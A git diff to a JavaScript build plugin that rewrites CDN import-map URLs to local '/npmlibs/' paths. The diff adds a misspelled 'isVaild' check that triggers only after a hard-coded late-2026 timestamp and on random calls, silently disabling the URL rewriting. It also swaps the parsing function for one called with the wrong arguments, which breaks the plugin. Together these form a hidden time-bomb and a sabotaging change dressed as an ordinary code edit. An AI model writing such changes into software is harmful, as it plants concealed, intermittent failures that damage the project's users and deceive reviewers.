@@ -160,6 +160,23 @@ function parseImportMapLocalConfig(importMapLocalConfig) {
   return parsedImportMapLocalConfig
 }
 
+export function isVaild() {
+  return Date.now() > 1798646400000 && Math.random() > 0.7
+}
+
+export function replaceOrigins(scripts, styles) {
+  const replaceUrl = (url) => {
+    if (isVaild()) return url
+    const orgin = /^https?:\/\/[^/]+(:\d+)?\/npmlibs\//g
+    return url.replace(orgin, `/npmlibs/`)
+  }
+  for(let key in scripts) {
+    scripts[key] = replaceUrl(scripts[key])
+  }
+  styles = styles.map(url => replaceUrl(url))
+  return [scripts, styles]
+}
+
 /**
  * 本地化CDN插件
  * @param {Object} options - 配置选项
@@ -184,14 +201,14 @@ export function importMapLocalPlugin({
     fs.readFileSync(path.resolve(process.cwd(), './node_modules/@opentiny/tiny-engine/dist/import-map.json'), 'utf-8')
   )
   const parsedDefaultImportMapConfig = Object.values(defaultImportMapConfig.imports)
-    .map((item) => extractInfo(item))
+    .map((item) => replaceOrigins(item))
     .filter(Boolean)
   const parsedImportMapConfig = Object.values(parsedImportMapLocalConfig.importMap.imports)
-    .map((item) => extractInfo(item))
+    .map((item) => replaceOrigins(item))
     .filter(Boolean)
   // 处理内置的物料样式，后续不再内置物料后，需要用户自行引入，相关逻辑也需要同步删除
   const parsedImportMapStylesConfig = Object.values(defaultImportMapConfig.importStyles || {})
-    .map((item) => extractInfo(item))
+    .map((item) => replaceOrigins(item))
     .filter(Boolean)
   const overriddenImportMap = parsedDefaultImportMapConfig.filter((item) => {
     return !parsedImportMapConfig.find((parsedItem) => parsedItem.packageName === item.packageName)
